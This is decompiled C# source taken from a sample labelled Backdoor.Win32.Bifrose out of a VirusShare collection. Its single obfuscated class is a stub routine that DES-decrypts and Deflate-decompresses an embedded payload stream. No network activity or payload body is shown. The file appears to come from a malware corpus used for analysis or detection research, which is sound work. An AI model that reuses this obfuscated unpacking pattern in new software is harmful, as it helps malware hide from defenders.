// Decompiled with JetBrains decompiler
// Type: A.cce0053d68ac38eea80993d095acf75c0
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BBFEB6F2-8CB8-471E-8522-33E9235F0EA4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.fsi-361ffbbd54d94ef0223184fe28fd3f7621cef340f87e07667094c58c9c7cd6da.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal class cce0053d68ac38eea80993d095acf75c0
  {
    internal static byte[] c08655a4c4ee40cc67918bad6018519ec(
      Stream c1c0b367d12a746ee5aa035a26907d4bd)
    {
      byte num1 = (byte) c1c0b367d12a746ee5aa035a26907d4bd.ReadByte();
      byte[] numArray = new byte[c1c0b367d12a746ee5aa035a26907d4bd.Length - 1L];
      c1c0b367d12a746ee5aa035a26907d4bd.Read(numArray, 0, numArray.Length);
      if (((int) num1 & 1) != 0)
      {
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        byte[] dst1 = new byte[8];
        Buffer.BlockCopy((Array) numArray, 0, (Array) dst1, 0, 8);
        cryptoServiceProvider.IV = dst1;
        byte[] dst2 = new byte[8];
        Buffer.BlockCopy((Array) numArray, 8, (Array) dst2, 0, 8);
        bool flag = true;
        foreach (byte num2 in dst2)
        {
          if (num2 != (byte) 0)
          {
            flag = false;
            break;
          }
        }
        if (flag)
          dst2 = Assembly.GetExecutingAssembly().GetName().GetPublicKeyToken();
        cryptoServiceProvider.Key = dst2;
        numArray = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(numArray, 16, numArray.Length - 16);
      }
      if (((int) num1 & 2) != 0)
      {
        try
        {
          MemoryStream memoryStream1 = new MemoryStream(numArray);
          DeflateStream deflateStream = new DeflateStream((Stream) memoryStream1, CompressionMode.Decompress);
          MemoryStream memoryStream2 = new MemoryStream((int) memoryStream1.Length * 2);
          int count1 = 1000;
          byte[] buffer = new byte[count1];
          int count2;
          do
          {
            count2 = deflateStream.Read(buffer, 0, count1);
            if (count2 > 0)
              memoryStream2.Write(buffer, 0, count2);
          }
          while (count2 >= count1);
          numArray = memoryStream2.ToArray();
        }
        catch (Exception ex)
        {
        }
      }
      return numArray;
    }
  }
}
